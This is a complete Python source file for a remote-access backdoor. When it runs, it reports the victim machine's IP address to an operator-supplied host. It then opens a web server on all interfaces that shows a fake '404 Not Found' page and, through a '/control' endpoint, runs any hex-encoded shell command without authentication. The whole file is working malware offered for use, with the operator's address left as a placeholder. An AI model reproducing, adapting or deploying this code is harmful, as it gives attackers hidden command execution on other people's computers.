import cherrypy ,os ,requests ,time ,socket ,binascii

Host="" #<Your Ip>
port = 8080 #<Port To Listen On>
def First():
    try:
        #Choose Local ip or Public ip depends on where's the target
        #Public IP for wan
        #ip = requests.get("http://api.ipify.org/?format=text").content
        #Local Ip for lan
        s = socket.socket()
        s.connect(("gmail.com",80))
        ip = str(s.getsockname()[0])
        s.close()
        a= requests.post("http://{0}:{1}/NewConnection".format(Host,port),{"ip":"{0}".format(binascii.hexlify(ip))})
    except:
        time.sleep(1)
        First()
First()
class Main(object):
    @cherrypy.expose
    def index(self):
        return "<h1>Error :404 Not Found</h1>" #:D

    @cherrypy.expose
    def control(self, cmd):
        cmd = binascii.unhexlify(cmd)
        return binascii.hexlify(os.popen(cmd).read())

if __name__ == '__main__':
    cherrypy.server.socket_host = "0.0.0.0"
    cherrypy.server.socket_port = port
    cherrypy.quickstart(Main())
